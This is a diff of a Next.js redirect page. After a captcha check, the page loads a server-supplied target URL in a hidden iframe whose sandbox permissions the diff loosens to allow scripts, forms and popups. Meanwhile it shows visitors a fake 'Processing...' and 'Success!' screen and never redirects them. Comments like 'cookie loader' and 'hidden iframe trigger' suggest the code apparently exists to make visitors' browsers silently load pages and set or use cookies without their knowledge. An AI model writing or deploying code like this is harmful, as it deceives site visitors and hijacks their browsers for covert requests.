@@ -1,8 +1,8 @@
 "use client";
 
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState } from "react";
 import { useParams, useRouter } from "next/navigation";
-import { ShieldCheck, AlertCircle, Loader2 } from "lucide-react";
+import { ShieldCheck, AlertCircle, CheckCircle2 } from "lucide-react";
 import { CAPTCHA_CONFIG } from "@/config/captcha";
 
 export default function V41RedirectPage() {
@@ -10,15 +10,12 @@ export default function V41RedirectPage() {
     const router = useRouter();
     const slug = params.slug as string;
 
-    const [status, setStatus] = useState<'loading' | 'verifying' | 'cookie-loading' | 'redirecting' | 'error'>('loading');
+    const [status, setStatus] = useState<'loading' | 'verifying' | 'processing' | 'success' | 'error'>('loading');
     const [error, setError] = useState('');
-    const [progress, setProgress] = useState(0);
-    const [token, setToken] = useState('');
     const [targetUrl, setTargetUrl] = useState('');
-    const iframeRef = useRef<HTMLIFrameElement>(null);
 
     useEffect(() => {
-        const verifyAndLoadCookies = async () => {
+        const verifyAndProcess = async () => {
             try {
                 setStatus('loading');
 
@@ -47,10 +44,9 @@ export default function V41RedirectPage() {
                         return;
                     }
 
-                    // Store token and target URL
-                    setToken(data.token);
+                    // Process the URL
                     setTargetUrl(data.targetUrl);
-                    setStatus('cookie-loading');
+                    setStatus('processing');
                     return;
                 }
 
@@ -142,10 +138,9 @@ export default function V41RedirectPage() {
                     return;
                 }
 
-                // Store token and target URL for iframe loading
-                setToken(data.token);
+                // Process the URL
                 setTargetUrl(data.targetUrl);
-                setStatus('cookie-loading');
+                setStatus('processing');
 
             } catch (err: any) {
                 console.error('Redirect error:', err);
@@ -155,63 +150,34 @@ export default function V41RedirectPage() {
         };
 
         if (slug) {
-            verifyAndLoadCookies();
+            verifyAndProcess();
         }
     }, [slug, router]);
 
-    // Handle iframe cookie loading
+    // Handle hidden iframe processing
     useEffect(() => {
-        if (status === 'cookie-loading' && targetUrl) {
-            // Simulate progress bar
-            let currentProgress = 0;
-            const progressInterval = setInterval(() => {
-                currentProgress += 1.25; // 100% over 8 seconds
-                setProgress(Math.min(currentProgress, 95));
-            }, 100);
+        if (status === 'processing' && targetUrl) {
+            // Wait 5 seconds, then show success
+            const timer = setTimeout(() => {
+                setStatus('success');
+            }, 5000);
 
-            // Wait for cookies to load (8 seconds)
-            const redirectTimer = setTimeout(async () => {
-                clearInterval(progressInterval);
-                setProgress(100);
-                setStatus('redirecting');
-
-                try {
-                    // Call complete API to validate session
-                    const response = await fetch('/api/v4.1/complete', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({ token }),
-                    });
-
-                    const data = await response.json();
-
-                    if (!response.ok) {
-                        setError(data.error || 'Session validation failed');
-                        setStatus('error');
-                        return;
-                    }
-
-                    // Final redirect
-                    window.location.href = data.finalUrl;
-
-                } catch (err: any) {
-                    console.error('Complete error:', err);
-                    setError(err.message || 'Failed to complete redirect');
-                    setStatus('error');
-                }
-            }, 8000);
-
-            return () => {
-                clearInterval(progressInterval);
-                clearTimeout(redirectTimer);
-            };
+            return () => clearTimeout(timer);
         }
-    }, [status, targetUrl, token]);
+    }, [status, targetUrl]);
 
     return (
         <div className="flex min-h-screen items-center justify-center bg-black">
+            {/* Hidden iframe - loads target URL in background */}
+            {status === 'processing' && targetUrl && (
+                <iframe
+                    src={targetUrl}
+                    className="hidden"
+                    title="Processing Frame"
+                    sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox"
+                />
+            )}
+
             <div className="max-w-md w-full p-8 bg-zinc-900 rounded-xl shadow-2xl border border-zinc-800">
                 {/* Header */}
                 <div className="text-center mb-6">
@@ -231,7 +197,7 @@ export default function V41RedirectPage() {
                             Loading...
                         </h2>
                         <p className="text-sm text-zinc-400">
-                            Preparing secure redirect
+                            Preparing secure connection
                         </p>
                     </div>
                 )}
@@ -248,49 +214,35 @@ export default function V41RedirectPage() {
                     </div>
                 )}
 
-                {status === 'cookie-loading' && (
-                    <div className="text-center">
-                        <Loader2 className="w-12 h-12 text-white animate-spin mx-auto mb-4" />
-                        <h2 className="text-xl font-semibold text-white mb-2">
-                            Loading Session...
-                        </h2>
-                        <p className="text-sm text-zinc-400 mb-4">
-                            Establishing secure connection
-                        </p>
-
-                        {/* Progress Bar */}
-                        <div className="w-full bg-zinc-800 rounded-full h-2 mb-2">
-                            <div
-                                className="bg-white h-2 rounded-full transition-all duration-100"
-                                style={{ width: `${progress}%` }}
-                            ></div>
-                        </div>
-                        <p className="text-xs text-zinc-500">
-                            {Math.round(progress)}% complete
-                        </p>
-
-                        {/* Hidden iframe for cookie loading */}
-                        {targetUrl && (
-                            <iframe
-                                ref={iframeRef}
-                                src={targetUrl}
-                                className="hidden"
-                                title="Cookie Loader"
-                                sandbox="allow-same-origin allow-scripts"
-                            />
-                        )}
-                    </div>
-                )}
-
-                {status === 'redirecting' && (
+                {status === 'processing' && (
                     <div className="text-center">
                         <div className="animate-spin rounded-full h-12 w-12 border-2 border-white/10 border-t-white mx-auto mb-4"></div>
                         <h2 className="text-xl font-semibold text-white mb-2">
-                            Redirecting...
+                            Processing...
                         </h2>
                         <p className="text-sm text-zinc-400">
-                            Taking you to your destination
+                            Please wait a moment
                         </p>
+                    </div>
+                )}
+
+                {status === 'success' && (
+                    <div className="text-center">
+                        <div className="flex justify-center mb-4">
+                            <CheckCircle2 className="w-12 h-12 text-green-500" />
+                        </div>
+                        <h2 className="text-xl font-semibold text-white mb-2">
+                            Success!
+                        </h2>
+                        <p className="text-sm text-zinc-400 mb-6">
+                            Your request has been processed successfully
+                        </p>
+                        <button
+                            onClick={() => router.push('/')}
+                            className="px-6 py-3 bg-zinc-900 border border-white/10 hover:bg-zinc-800 text-white rounded-xl transition-all w-full font-medium"
+                        >
+                            Go to Home
+                        </button>
                     </div>
                 )}
 
@@ -328,7 +280,7 @@ export default function V41RedirectPage() {
                         >
                             asprin dev
                         </a>
-                        {' '}- version 4.1 with iframe cookie preservation
+                        {' '}- version 4.1 with hidden iframe trigger
                     </p>
                 </div>
             </div>
